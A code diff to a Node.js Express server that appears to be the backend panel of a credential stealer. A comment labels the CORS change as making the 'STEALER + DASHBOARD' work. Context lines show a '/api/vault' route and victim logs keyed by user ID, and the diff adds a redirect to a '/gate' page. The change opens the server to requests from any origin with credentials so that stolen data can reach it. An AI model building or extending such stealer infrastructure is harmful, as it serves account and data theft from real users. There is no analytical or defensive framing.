@@ -1,8 +1,15 @@
 const express = require('express');
+const cors = require('cors');
 const fs = require('fs');
 const path = require('path');
 const app = express();
 
+app.use(cors({
+  origin: '*', // UNLOCKS ALL – STEALER + DASHBOARD SAFE
+  credentials: true,
+  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+  allowedHeaders: ['Content-Type']
+}));
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static('public'));
@@ -56,6 +63,11 @@ app.get('/api/vault', (req, res) => {
 app.get('/avatar/:id', (req, res) => {
   const url = logs.find(l => l.userId === req.params.id)?.avatarUrl;
   res.redirect(url || 'https://i.imgur.com/removed.png');
+});
+
+// CATCH-ALL FOR ROOT (REDIRECT TO GATE)
+app.get('/', (req, res) => {
+  res.redirect('/gate');
 });
 
 const port = process.env.PORT || 3000;
